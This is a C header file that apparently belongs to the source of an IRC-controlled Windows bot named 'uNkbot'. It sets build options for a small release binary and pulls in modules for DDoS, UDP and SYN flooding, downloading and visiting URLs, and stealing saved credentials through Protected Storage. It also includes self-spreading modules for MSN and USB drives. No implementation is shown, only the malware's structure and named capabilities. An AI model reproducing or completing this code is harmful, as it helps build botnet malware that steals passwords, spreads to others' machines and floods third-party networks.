#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#pragma optimize("gsy",on)
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/IGNORE:4089")
#pragma comment(linker, "/IGNORE:4108")
#pragma comment(linker,"/STUB:stub.exe") 

#pragma comment(lib, "advapi32")
#pragma comment(lib, "wininet")
#pragma comment(lib, "shell32")

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <winable.h>
#include <wininet.h>
#include <iphlpapi.h>

#include "defines.h"

#ifndef NO_PSTORE
#import <pstorec.dll> no_namespace
#endif

#include "loaddlls.h"
#include "uNkbot.h"
#include "utility.h"
#include "irc.h"
#include "commands.h"
#include "protocol.h"
#include "threads.h"
#include "externs.h"

#include "Modules\ddos.h"
#include "Modules\download.h"
#include "Modules\udp.h"
#include "Modules\pstore.h"
#include "Modules\supersyn.h"
#include "Modules\visit.h"
#include "Modules\ZipIt.h"

#include "Spreaders\msn.h"
#include "Spreaders\usb.h"
#include <shellapi.h>
